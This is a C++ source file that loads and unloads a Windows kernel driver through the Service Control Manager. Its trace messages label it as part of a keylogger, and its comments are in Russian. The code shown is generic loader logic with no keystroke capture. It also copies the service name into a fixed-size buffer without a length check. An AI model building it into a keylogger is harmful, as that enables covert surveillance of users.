#include <stdafx.h>
#include "drvload.h"
#include "msgthread.h"

extern "C"
{
	#include "kdprint\kdctl.h"
	#include "kdprint\user\client\kdprint_cli.h"
}

BOOL CDrvLoad::Start(PTCHAR ServiceName, PTCHAR BinaryPath, PTCHAR DisplayName)
{
	SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (!hSCM)
		return FALSE;

// удаляем, если есть что..
	SC_HANDLE hService = OpenService(hSCM, ServiceName, DELETE);
	if (hService)
	{
		ATLTRACE("keylogger: removed existing %s service entry\n", ServiceName);

		DeleteService(hService);
		CloseServiceHandle(hService);
	}
// создаем заново
	hService = CreateService(hSCM, ServiceName, DisplayName, SERVICE_START | SERVICE_STOP | DELETE,
			SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, BinaryPath,
			NULL, NULL, NULL, NULL, "");
	if (!hService)
	{
		ATLTRACE("keylogger: failed to create %s service entry, lasterror=%d\n", ServiceName, GetLastError());

		CloseServiceHandle(hSCM);
		return FALSE;
	}

	ATLTRACE("keylogger: created %s service entry\n", ServiceName);

	if (!StartService(hService, 0, NULL))
	{
		ATLTRACE("keylogger: failed to start %s service\n", ServiceName);

		DeleteService(hService);
		CloseServiceHandle(hSCM);
		return FALSE;
	}

	ATLTRACE("keylogger: started %s service\n", ServiceName);

	CHAR ControlDeviceName[256];
	strcpy(ControlDeviceName, U_CONTROL_DEVICE_PREFIX);
	strcat(ControlDeviceName, ServiceName);
	if (!Client_InitKDPrintDevice(ControlDeviceName))
	{
		SERVICE_STATUS ServiceStatus;

		ATLTRACE("keylogger: failed to InitKDPrintDevice, stopping %s service\n", ServiceName);
		ControlService(hService, SERVICE_CONTROL_STOP, &ServiceStatus);
		ATLTRACE("keylogger: %s service stopped\n", ServiceName);
		DeleteService(hService);
		ATLTRACE("keylogger: removed %s service\n", ServiceName);

		return FALSE;
	}

	CloseServiceHandle(hService);
	CloseServiceHandle(hSCM);

	return TRUE;
}

BOOL CDrvLoad::Stop(PTCHAR ServiceName)
{
// чтобы не залипала выгрузка
	CMsgThread MsgThread;
	MsgThread.Start();

	BOOLEAN bRet = FALSE;

	SC_HANDLE hSCM = OpenSCManager(NULL, NULL, 0);
	if (!hSCM)
		return FALSE;

	SC_HANDLE hService = OpenService(hSCM, ServiceName, SERVICE_STOP | DELETE);
	if (hService)
	{
		SERVICE_STATUS ServiceStatus;

		if (ControlService(hService, SERVICE_CONTROL_STOP, &ServiceStatus))
		{ 
			ATLTRACE("keylogger: stopped %s service\n", ServiceName);

			if (DeleteService(hService))
			{
				ATLTRACE("keylogger: removed %s service from SCM database\n", ServiceName);
				bRet = TRUE;
			}
		}
		else
			ATLTRACE("keylogger: failed to stop %s service\n", ServiceName);
		
		CloseServiceHandle(hService);
	}
	else
		ATLTRACE("keylogger: failed to open %s service entry\n", ServiceName);

	CloseServiceHandle(hSCM);

	MsgThread.Stop();

	return bRet;
}
